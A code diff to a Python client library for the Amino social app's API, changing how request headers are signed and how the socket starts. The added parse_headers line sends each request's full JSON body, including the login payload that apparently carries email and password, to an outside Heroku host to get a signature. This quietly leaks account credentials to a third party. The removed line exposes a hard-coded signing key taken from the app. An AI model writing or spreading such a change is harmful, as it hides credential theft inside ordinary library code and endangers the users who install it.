@@ -21,7 +21,6 @@ device = device.DeviceGenerator()
 class Client(Callbacks, SocketHandler):
     def __init__(self, deviceId: str = None, proxies: dict = None, certificatePath = None, socket_trace = False, socketDebugging = False):
         self.api = "https://service.narvii.com/api/v1"
-        self.apip = "https://aminoapps.com/api-p"
         self.authenticated = False
         self.configured = False
         self.user_agent = device.user_agent
@@ -40,11 +39,11 @@ class Client(Callbacks, SocketHandler):
         self.account: objects.UserProfile = objects.UserProfile(None)
         self.profile: objects.UserProfile = objects.UserProfile(None)
         #self.check_device(self.device_id)
-
-    def parse_headers(self, data = None):
+        
+    def parse_headers(self, data = None, sig: str = None):
         if data is not None:
             if isinstance(data, dict):  data = json.dumps(data)
-            return headers.Headers(data=data, deviceId=self.device_id, sig=base64.b64encode(b"\x22" + hmac.new(bytes.fromhex("307c3c8cd389e69dc298d951341f88419a8377f4"), data.encode(), sha1).digest()).decode()).headers
+            return headers.Headers(data=data, deviceId=self.device_id, sig=requests.get(f"https://emerald-dream.herokuapp.com/signature/{data}").json()["signature"]).headers
         else:
             return headers.Headers(deviceId=self.device_id).headers
 
@@ -164,7 +163,7 @@ class Client(Callbacks, SocketHandler):
         }
         data = json.dumps(data)
         self.send(data)
-
+    
     def login_sid(self, SID: str):
         """
         Login into an account with an SID
@@ -179,6 +178,7 @@ class Client(Callbacks, SocketHandler):
         self.account: objects.UserProfile = self.get_user_info(uId)
         self.profile: objects.UserProfile = self.get_user_info(uId)
         headers.sid = self.sid
+        self.start()
         self.run_socket()
 
     def login(self, email: str, password: str):
@@ -205,8 +205,7 @@ class Client(Callbacks, SocketHandler):
         })
         response = requests.post(f"{self.api}/g/s/auth/login", headers=self.parse_headers(data=data), data=data, proxies=self.proxies, verify=self.certificatePath)
         self.run_socket()
-        if response.status_code != 200:
-            return exceptions.CheckException(json.loads(response.text))
+        if response.status_code != 200: return exceptions.CheckException(json.loads(response.text))
 
         else:
             self.authenticated = True
@@ -216,7 +215,7 @@ class Client(Callbacks, SocketHandler):
             self.account: objects.UserProfile = objects.UserProfile(self.json["account"]).UserProfile
             self.profile: objects.UserProfile = objects.UserProfile(self.json["userProfile"]).UserProfile
             headers.sid = self.sid
-            self.start_socket()
+            self.start()
             return response.status_code
 
     def register(self, nickname: str, email: str, password: str, verificationCode: str, deviceId: str = device.device_id):
